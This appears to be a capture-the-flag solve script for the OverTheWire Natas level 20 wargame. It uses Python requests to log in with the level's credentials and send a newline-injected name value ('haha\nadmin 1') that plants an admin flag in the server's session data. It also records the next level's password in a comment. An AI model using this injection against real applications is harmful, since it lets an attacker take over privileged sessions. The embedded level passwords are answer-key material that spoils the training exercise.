import requests

url = 'http://natas20.natas.labs.overthewire.org/?debug=True'
username= 'natas20'
password = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'

session = requests.session()

response = session.get(url, auth=(username, password))
print(response.text)
print("--"*40)
response = session.post(url, data={"name": "haha\nadmin 1"}, auth=(username, password))
print(response.text)
print("--"*40)
response = session.get(url, auth=(username, password))
print(response.text)

# natas21_pass: IFekPyrQXftziDEsUr3x21sYuahypdgJ